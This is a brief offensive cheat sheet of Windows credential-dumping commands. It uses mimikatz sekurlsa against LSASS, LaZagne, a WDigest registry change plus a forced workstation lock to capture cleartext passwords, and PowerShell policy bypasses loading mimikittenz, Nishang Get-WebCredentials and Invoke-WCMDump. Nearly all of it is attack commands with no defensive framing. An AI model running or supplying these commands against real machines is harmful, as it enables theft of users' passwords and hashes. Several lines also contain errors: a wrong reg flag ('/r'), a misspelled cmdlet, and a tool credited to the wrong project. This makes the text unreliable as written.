
# Dumping logon passwords and hashes with mimikatz
```bash
./mimikatz64.exe "privilege::debug" "sekurlsa::logonPasswords full" "exit"
```
-----------------------

# With LaZagne

https://github.com/AlessandroZ/LaZagne
```bash
LaZagne.exe all
```
-----------------------

# Clear text passwords with Mimikatz
```bash
# Add pasword to LSASS
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /r REG_DWORD /d 1 /f

# Lock users out
rundll32.exe user32.dll,LockWorkStation

# Get clear text passwords with Mimikatz
privilege::debug
sekurlsa::logonPasswords
```
-----------------------

# Gather passwords from applications with Mimikittenz
https://github.com/orlyjamie/mimikittenz
```bash
powershell -ep bypass
Import-Module .\Invoke-mimikittenz.ps1
Imvoke-mimikittenz
```
-----------------------

# Gather Web Credentials with Nishang
https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1
```bash
powershell -ep bypass
Import-Module .\Get-WebCredentials.ps1
Get-WebCredentials
```
-----------------------

# Gather Windows Credentials with Nishang
https://github.com/peewpw/Invoke-WCMDump
```bash
powershell -ep bypass
Import-Module .\Invoke-WCMDump.ps1
Invoke-WCMDump
```
-----------------------
